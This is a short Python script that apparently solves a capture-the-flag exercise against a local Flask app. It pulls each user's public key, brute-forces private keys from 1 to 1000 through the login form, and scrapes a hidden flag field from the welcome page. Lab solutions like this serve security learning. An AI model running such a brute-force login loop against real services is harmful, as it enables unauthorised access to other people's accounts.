import requests
from bs4 import BeautifulSoup

# Change the URL to your Flask app's running address
BASE_URL = "http://127.0.0.1:5000"
session = requests.Session()

def try_login(public_key, private_key):
    data = {
        "public_key": public_key,
        "private_key": private_key
    }
    response = session.post(f"{BASE_URL}/", data=data)
    return response

def get_flag_from_html(html_content):
    soup = BeautifulSoup(html_content, "html.parser")
    flag_element = soup.find("input", {"type": "hidden", "id": "flag"})
    if flag_element:
        flag = flag_element["value"]
        return flag
    return None

def main():
    public_keys_response = session.get(f"{BASE_URL}/public_keys")
    public_keys_data = public_keys_response.json()

    for username, user_data in public_keys_data.items():
        public_key = user_data  # No need to access "public_key" key here
        print(f"Trying to log in as {username} with public key: {public_key}")

        for private_key_guess in range(1, 1001):
            response = try_login(public_key, private_key_guess)
            if "Welcome" in response.text:
                flag = get_flag_from_html(response.text)
                if flag:
                    print(f"Flag for {username}: {flag}")
                else:
                    print(f"Flag not found for {username}")
                break

if __name__ == "__main__":
    main()
